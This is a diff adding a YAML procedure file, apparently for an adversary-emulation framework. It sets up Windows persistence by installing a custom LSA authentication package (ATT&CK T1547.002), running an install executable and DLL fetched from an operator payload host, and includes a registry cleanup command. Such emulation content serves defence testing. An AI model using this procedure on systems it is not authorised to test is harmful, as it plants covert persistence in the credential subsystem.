@@ -1,0 +1,25 @@
+id: 83a60a83-4d0c-4559-96ca-b5f45438347b
+name: Authentication Package
+description: >-
+  This procedure establishes persistence using a custom authentication package
+  for the Local Security Authority (LSA). To be successfully executed, the agent
+  must be running with administrative privileges.
+tactic: persistence
+technique:
+  id: T1547.002
+  name: Authentication Package
+platforms:
+  windows:
+    psh:
+      command: 'Start-Process .\install.exe "#{operator.payloads}/uploads/package.dll"'
+      payload: '#{operator.payloads}/uploads/install.exe'
+      variants:
+        - command: >-
+            # Cleanup
+            reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v
+            "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+metadata:
+  authors:
+    - tr4cefl0w
+  tags: []
+  enabled: true
